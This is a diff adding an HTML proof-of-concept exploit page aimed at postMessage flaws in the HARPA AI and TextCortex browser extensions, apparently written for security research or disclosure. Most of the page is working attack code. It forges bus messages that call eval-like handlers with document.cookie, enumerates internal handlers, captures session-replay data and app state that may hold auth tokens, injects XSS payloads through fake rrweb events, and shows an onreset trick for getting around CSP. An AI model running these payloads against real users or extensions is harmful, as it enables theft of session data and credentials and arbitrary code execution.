@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS PoC - Chrome Extension PostMessage Vulnerabilities</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
+    h1 { color: #e94560; }
+    h2 { color: #0f3460; background: #e94560; padding: 8px; margin-top: 30px; }
+    .poc { background: #16213e; border: 1px solid #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; }
+    button { background: #e94560; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 5px; border-radius: 3px; font-family: monospace; }
+    button:hover { background: #c73550; }
+    #log { background: #0a0a1a; padding: 15px; max-height: 400px; overflow-y: auto; border: 1px solid #333; margin-top: 10px; white-space: pre-wrap; word-break: break-all; }
+    .success { color: #4ecca3; }
+    .warn { color: #ffc107; }
+    .error { color: #e94560; }
+    .info { color: #7ec8e3; }
+  </style>
+</head>
+<body>
+
+<h1>PostMessage XSS PoC - Extension Vulnerabilities</h1>
+<p>Open this page on a site where the target extension content scripts are injected.<br>
+Then click the buttons below to trigger each attack vector.</p>
+
+<div id="log"></div>
+
+<h2>PoC 1: HARPA AI Bus Message Injection (cs.js)</h2>
+<div class="poc">
+  <p><b>Vulnerability:</b> cs.js listens for <code>window.postMessage</code> with no origin check.
+  The only validation is <code>_isBusMsg</code>: <code>e.$bus === true && e.appName === "__app_hrp"</code>.
+  Any page script can craft this message. The handler calls <code>_callHandlers</code> with attacker-controlled
+  <code>name</code> and <code>args</code>, and relays to the extension background via <code>_sendToExt</code>.</p>
+
+  <button onclick="poc1_busSendProxy()">Trigger bus.proxy injection</button>
+  <button onclick="poc1_busCallHandler()">Trigger handler call with crafted args</button>
+  <button onclick="poc1_busEnumerate()">Enumerate registered handlers</button>
+</div>
+
+<h2>PoC 2: HARPA AI - chrome.runtime.onMessage relay to postMessage("*")</h2>
+<div class="poc">
+  <p><b>Vulnerability:</b> cs.js relays chrome.runtime messages to the page via
+  <code>window.postMessage(t, "*")</code>. The response message <code>{resId, result}</code>
+  is also posted with <code>"*"</code>. An attacker page can listen for these responses
+  to intercept extension internal data.</p>
+
+  <button onclick="poc2_interceptResponses()">Start intercepting bus responses</button>
+  <button onclick="poc2_triggerAndCapture()">Send message & capture response</button>
+</div>
+
+<h2>PoC 3: TextCortex - rrweb Session Replay Data Theft (668.js)</h2>
+<div class="poc">
+  <p><b>Vulnerability:</b> rrweb in 668.js posts session recording data (full DOM snapshots,
+  mutations, user interactions) via <code>window.parent.postMessage({type:"rrweb",...}, "*")</code>.
+  If the extension page is iframed, the parent steals all session data.</p>
+
+  <button onclick="poc3_iframeCapture()">Create iframe & capture rrweb data</button>
+  <p><small>Note: This creates an iframe to a target site. The extension's rrweb will post data to us.</small></p>
+</div>
+
+<h2>PoC 4: TextCortex - Redux State Exfiltration (popup.js / sidepanel.js)</h2>
+<div class="poc">
+  <p><b>Vulnerability:</b> popup.js and sidepanel.js broadcast full Redux store state via
+  <code>window.postMessage({body:"Data", state:JSON.stringify(store)})</code> with no targetOrigin.
+  Any same-page listener captures the entire application state including auth tokens.</p>
+
+  <button onclick="poc4_captureReduxState()">Listen for Redux state broadcasts</button>
+</div>
+
+<h2>PoC 5: TextCortex - rrweb Fake Event Injection (668.js)</h2>
+<div class="poc">
+  <p><b>Vulnerability:</b> The rrweb <code>handleMessage</code> checks
+  <code>t.data.type === "rrweb" && t.origin === t.data.origin</code>.
+  The origin check is self-referential - the attacker sets <code>data.origin</code> to match their own
+  <code>event.origin</code>. A cross-origin iframe can inject fake rrweb events into the parent's
+  recording pipeline.</p>
+
+  <button onclick="poc5_injectFakeRrwebEvent()">Inject fake rrweb event from iframe</button>
+</div>
+
+<h2>PoC 6: HARPA AI - executeJs via DOM event handler (cs.js)</h2>
+<div class="poc">
+  <p><b>Vulnerability:</b> cs.js has an <code>executeJs</code> method that creates a DOM element,
+  sets <code>onreset</code> attribute with the JS code, and dispatches a reset event.
+  This bypasses CSP in some configurations. If any bus handler path reaches executeJs with
+  attacker-controlled input, it achieves arbitrary code execution.</p>
+
+  <button onclick="poc6_executeJsDemo()">Demo: executeJs technique (local)</button>
+</div>
+
+<script>
+// ========== Logging ==========
+function log(msg, cls = 'info') {
+  const el = document.getElementById('log');
+  const ts = new Date().toISOString().split('T')[1].split('.')[0];
+  el.innerHTML += `<span class="${cls}">[${ts}] ${escapeHtml(String(msg))}</span>\n`;
+  el.scrollTop = el.scrollHeight;
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ========== PoC 1: HARPA Bus Message Injection ==========
+
+function poc1_busSendProxy() {
+  log('--- PoC 1a: Sending crafted bus.proxy message ---', 'warn');
+
+  // This message passes _isBusMsg: {$bus: true, appName: "__app_hrp"}
+  // It registers a proxy handler that will relay internal events to attacker
+  const payload = {
+    $bus: true,
+    appName: "__app_hrp",
+    name: "bus.proxy",
+    locus: "nj",
+    args: ["store.change", true],  // subscribe to store change events
+    reqId: "bus-" + Date.now() + "-" + Math.random().toString(36).slice(2)
+  };
+
+  window.postMessage(payload, "*");
+  log('Sent bus.proxy subscription for "store.change" events', 'success');
+  log('Payload: ' + JSON.stringify(payload), 'info');
+  log('If HARPA is active, the content script will register a proxy handler', 'info');
+  log('and forward internal store.change events to our page via postMessage(*)', 'warn');
+}
+
+function poc1_busCallHandler() {
+  log('--- PoC 1b: Calling handler with crafted args ---', 'warn');
+
+  // Attempt to invoke internal handlers with attacker-controlled arguments
+  const payloads = [
+    { name: "page.eval", args: ["document.cookie"] },
+    { name: "tab.eval", args: ["document.cookie"] },
+    { name: "engine.run", args: [{ command: "alert('XSS')" }] },
+    { name: "nj.eval", args: ["alert(document.domain)"] },
+  ];
+
+  payloads.forEach((p, i) => {
+    const msg = {
+      $bus: true,
+      appName: "__app_hrp",
+      name: p.name,
+      locus: "nj",
+      args: p.args,
+      reqId: "bus-" + Date.now() + "-" + i
+    };
+    window.postMessage(msg, "*");
+    log(`Sent handler call: ${p.name}(${JSON.stringify(p.args)})`, 'info');
+  });
+
+  log('If any handler exists for these names, it executes with our args', 'error');
+}
+
+function poc1_busEnumerate() {
+  log('--- PoC 1c: Enumerating handlers via response timing ---', 'warn');
+
+  // Try common handler names and observe which ones get responses
+  const handlerNames = [
+    "store.get", "store.set", "store.actions", "store.change",
+    "page.content", "page.eval", "page.html", "page.text",
+    "tab.info", "tab.url", "tab.eval",
+    "user.info", "user.token", "user.settings",
+    "nj.eval", "nj.config", "nj.command",
+    "engine.run", "engine.command", "engine.eval",
+    "chat.send", "chat.history",
+    "idb.get", "idb.set", "idb.change",
+    "ai.complete", "ai.chat",
+  ];
+
+  const startTime = Date.now();
+  const responses = {};
+
+  // Listen for responses
+  const listener = (e) => {
+    if (e.data && e.data.resId) {
+      const name = responses[e.data.resId];
+      if (name) {
+        log(`RESPONSE for "${name}": ${JSON.stringify(e.data.result).slice(0, 200)}`, 'success');
+      }
+    }
+  };
+  window.addEventListener("message", listener);
+
+  handlerNames.forEach((name, i) => {
+    const reqId = "enum-" + Date.now() + "-" + i;
+    responses[reqId] = name;
+    window.postMessage({
+      $bus: true,
+      appName: "__app_hrp",
+      name: name,
+      locus: "nj",
+      args: [],
+      reqId: reqId
+    }, "*");
+  });
+
+  log(`Sent ${handlerNames.length} probe messages, waiting for responses...`, 'info');
+
+  setTimeout(() => {
+    window.removeEventListener("message", listener);
+    log('Enumeration complete. Handlers that responded are logged above.', 'warn');
+  }, 3000);
+}
+
+// ========== PoC 2: Intercept bus responses ==========
+
+let intercepting = false;
+
+function poc2_interceptResponses() {
+  if (intercepting) { log('Already intercepting', 'warn'); return; }
+  intercepting = true;
+  log('--- PoC 2: Intercepting all bus response messages ---', 'warn');
+
+  window.addEventListener("message", (e) => {
+    const d = e.data;
+    if (!d) return;
+
+    // Capture bus response messages
+    if (d.resId) {
+      log(`[INTERCEPTED RESPONSE] resId=${d.resId}, result=${JSON.stringify(d.result).slice(0, 300)}`, 'success');
+    }
+    // Capture bus event messages
+    if (d.$bus && d.appName === "__app_hrp") {
+      log(`[INTERCEPTED BUS MSG] name=${d.name}, locus=${d.locus}, args=${JSON.stringify(d.args || d.argsStr || '').slice(0, 300)}`, 'success');
+    }
+    // Capture any other extension messages
+    if (d.type === "connected" || d.type === "request") {
+      log(`[INTERCEPTED CTRL MSG] type=${d.type}, data=${JSON.stringify(d).slice(0, 300)}`, 'success');
+    }
+  });
+
+  log('Listener active. All postMessage traffic from extension will be captured.', 'info');
+}
+
+function poc2_triggerAndCapture() {
+  if (!intercepting) poc2_interceptResponses();
+  log('--- PoC 2b: Triggering message and capturing response ---', 'warn');
+
+  // Send a message that will trigger a response via window.postMessage({resId, result}, "*")
+  const reqId = "capture-" + Date.now();
+  window.postMessage({
+    $bus: true,
+    appName: "__app_hrp",
+    name: "store.get",
+    locus: "nj",
+    args: ["settings"],
+    reqId: reqId
+  }, "*");
+  log(`Sent store.get request with reqId=${reqId}`, 'info');
+  log('Response (if any) will appear above as INTERCEPTED RESPONSE', 'info');
+}
+
+// ========== PoC 3: rrweb Session Data Theft ==========
+
+function poc3_iframeCapture() {
+  log('--- PoC 3: Capturing rrweb session replay from iframe ---', 'warn');
+
+  // Listen for rrweb messages from any source
+  window.addEventListener("message", (e) => {
+    if (e.data && e.data.type === "rrweb") {
+      log(`[RRWEB CAPTURED] origin=${e.origin}`, 'error');
+      log(`  isCheckout: ${e.data.isCheckout}`, 'info');
+      log(`  event type: ${e.data.event?.type}`, 'info');
+      log(`  event data (truncated): ${JSON.stringify(e.data.event).slice(0, 500)}`, 'success');
+    }
+  });
+
+  // Create an iframe to a target site where TextCortex is active
+  const iframe = document.createElement('iframe');
+  iframe.src = 'https://example.com';  // Replace with target site
+  iframe.style.cssText = 'width:600px;height:400px;border:1px solid #e94560;margin:10px 0;';
+  document.querySelector('.poc:nth-of-type(3)')?.appendChild(iframe) ||
+    document.body.appendChild(iframe);
+
+  log('iframe created. If TextCortex rrweb is active in the iframe,', 'info');
+  log('it will post session recordings to us via postMessage("*")', 'warn');
+  log('This includes: DOM snapshots, mutations, mouse movements, keystrokes, form inputs', 'error');
+}
+
+// ========== PoC 4: Redux State Exfiltration ==========
+
+function poc4_captureReduxState() {
+  log('--- PoC 4: Listening for Redux/Zustand state broadcasts ---', 'warn');
+
+  window.addEventListener("message", (e) => {
+    const d = e.data;
+    if (!d) return;
+
+    // TextCortex broadcasts with body: "Innit" or "Data"
+    if (d.body === "Innit" || d.body === "Data") {
+      log(`[REDUX STATE CAPTURED] body="${d.body}"`, 'error');
+      try {
+        const state = JSON.parse(d.state);
+        log(`  Keys: ${Object.keys(state).join(', ')}`, 'info');
+
+        // Look for sensitive data
+        if (state.auth || state.user || state.token) {
+          log(`  AUTH DATA FOUND: ${JSON.stringify(state.auth || state.user || state.token).slice(0, 300)}`, 'error');
+        }
+        if (state.settings) {
+          log(`  SETTINGS: ${JSON.stringify(state.settings).slice(0, 300)}`, 'warn');
+        }
+        log(`  Full state (truncated): ${d.state.slice(0, 500)}`, 'success');
+      } catch (err) {
+        log(`  Raw state: ${String(d.state).slice(0, 500)}`, 'info');
+      }
+    }
+  });
+
+  log('Listener active. Waiting for Redux state broadcasts...', 'info');
+  log('If this page shares context with TextCortex popup/sidepanel,', 'info');
+  log('the full app state (including tokens) will appear above.', 'warn');
+}
+
+// ========== PoC 5: Fake rrweb Event Injection ==========
+
+function poc5_injectFakeRrwebEvent() {
+  log('--- PoC 5: Injecting fake rrweb event ---', 'warn');
+  log('The rrweb handleMessage only checks: t.data.type==="rrweb" && t.origin===t.data.origin', 'info');
+  log('We set data.origin to our own origin, which matches event.origin. Self-referential!', 'error');
+
+  // Create an iframe that will send a fake rrweb event to parent
+  const blob = new Blob([`
+    <!DOCTYPE html>
+    <html><body>
+    <script>
+      // This runs inside an iframe on our origin
+      // The rrweb handler checks: t.origin === t.data.origin
+      // Since we control both, we set data.origin = our origin
+      parent.postMessage({
+        type: "rrweb",
+        origin: location.origin,  // matches event.origin - bypasses the check!
+        isCheckout: true,
+        event: {
+          type: 2,  // FullSnapshot
+          data: {
+            node: {
+              type: 0,
+              childNodes: [{
+                type: 2,
+                tagName: "html",
+                attributes: {},
+                childNodes: [{
+                  type: 2,
+                  tagName: "body",
+                  attributes: {},
+                  childNodes: [{
+                    type: 2,
+                    tagName: "img",
+                    attributes: {
+                      src: "x",
+                      onerror: "alert('XSS via rrweb event injection')"
+                    },
+                    childNodes: []
+                  }]
+                }]
+              }]
+            }
+          },
+          timestamp: Date.now()
+        }
+      }, "*");
+    <\/script>
+    </body></html>
+  `], { type: 'text/html' });
+
+  const iframe = document.createElement('iframe');
+  iframe.src = URL.createObjectURL(blob);
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+
+  // Also send directly from this page
+  window.postMessage({
+    type: "rrweb",
+    origin: location.origin,
+    isCheckout: true,
+    event: {
+      type: 2,
+      data: {
+        node: {
+          type: 0,
+          childNodes: [{
+            type: 2,
+            tagName: "html",
+            attributes: {},
+            childNodes: [{
+              type: 2,
+              tagName: "body",
+              attributes: {},
+              childNodes: [{
+                type: 3,
+                textContent: "<img src=x onerror='alert(document.domain)'>"
+              }]
+            }]
+          }]
+        }
+      },
+      timestamp: Date.now()
+    }
+  }, "*");
+
+  log('Fake rrweb FullSnapshot event injected', 'success');
+  log('If rrweb replay reconstructs these nodes without sanitization,', 'info');
+  log('the injected <img onerror> executes arbitrary JS', 'error');
+}
+
+// ========== PoC 6: executeJs technique demo ==========
+
+function poc6_executeJsDemo() {
+  log('--- PoC 6: Demonstrating executeJs CSP bypass technique ---', 'warn');
+  log('This is the exact technique used in cs.js executeJs():', 'info');
+  log('  1. Create a <div> element', 'info');
+  log('  2. Set onreset="<arbitrary JS>"', 'info');
+  log('  3. dispatchEvent(new Event("reset"))', 'info');
+  log('  4. JS executes even under some CSP policies', 'error');
+
+  // Reproduce the exact technique from cs.js
+  const code = "document.title = 'XSS-EXECUTED-' + document.domain";
+  const div = document.createElement("div");
+  div.setAttribute("onreset", `const URL = window.URL; ${code}`);
+  div.dispatchEvent(new Event("reset"));
+
+  if (document.title.startsWith('XSS-EXECUTED-')) {
+    log(`SUCCESS: document.title = "${document.title}"`, 'success');
+    log('The executeJs technique works. If attacker-controlled data reaches', 'info');
+    log('the bus handler chain that calls executeJs(), arbitrary code runs.', 'error');
+  } else {
+    log('CSP blocked inline event handler (expected on strict CSP pages)', 'warn');
+    log('But many sites do not have strict CSP, and the extension', 'info');
+    log('itself uses this technique in its own content script context.', 'warn');
+  }
+
+  // Demonstrate the full attack chain
+  log('', 'info');
+  log('FULL ATTACK CHAIN:', 'error');
+  log('1. Attacker sends: postMessage({$bus:true, appName:"__app_hrp", name:"engine.run", args:[...]})', 'info');
+  log('2. cs.js _isBusMsg passes (only checks $bus + appName)', 'info');
+  log('3. _callHandlers invokes registered handler with attacker args', 'info');
+  log('4. If handler path reaches executeJs(attacker_input) → arbitrary code execution', 'error');
+}
+
+// ========== Auto-start passive listeners ==========
+log('PoC page loaded. Click buttons above to trigger individual attack vectors.', 'info');
+log('Passive listener started for all postMessage traffic on this window.', 'info');
+
+// Passive listener to show ALL postMessage traffic
+window.addEventListener("message", (e) => {
+  // Skip our own messages and React devtools
+  if (e.source === window && e.data && typeof e.data === 'object') {
+    if (e.data.$bus || e.data.type === 'rrweb' || e.data.body === 'Data' || e.data.body === 'Innit') {
+      // These are handled by specific PoC listeners
+      return;
+    }
+  }
+  if (e.data && typeof e.data === 'string' && e.data.startsWith('setImmediate$')) return;
+  if (e.data && e.data.source && e.data.source.startsWith('react-devtools')) return;
+
+  // Log everything else
+  const summary = typeof e.data === 'object' ? JSON.stringify(e.data).slice(0, 200) : String(e.data).slice(0, 200);
+  if (summary.length > 5) {
+    log(`[PASSIVE] origin=${e.origin} data=${summary}`, 'info');
+  }
+});
+</script>
+
+</body>
+</html>
